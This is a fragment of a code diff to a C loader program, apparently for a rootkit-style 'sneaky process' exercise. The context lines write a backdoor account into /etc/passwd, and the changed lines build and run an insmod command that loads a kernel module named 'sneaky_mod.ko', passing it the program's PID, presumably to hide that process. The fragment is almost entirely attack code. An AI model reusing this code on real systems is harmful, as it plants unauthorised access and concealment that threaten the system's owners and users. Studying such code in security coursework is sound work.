@@ -14,8 +14,8 @@ int main(){
   system("echo 'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash' >> /etc/passwd");
 
   //step3
-  char load_mod[32];
-  sprintf(load_mod, "insmod sneaky_process.ko mypid = %d", pid);
+  char load_mod[64];
+  sprintf(load_mod, "insmod sneaky_mod.ko mypid=%d", pid);
   system(load_mod);
   
   //step4
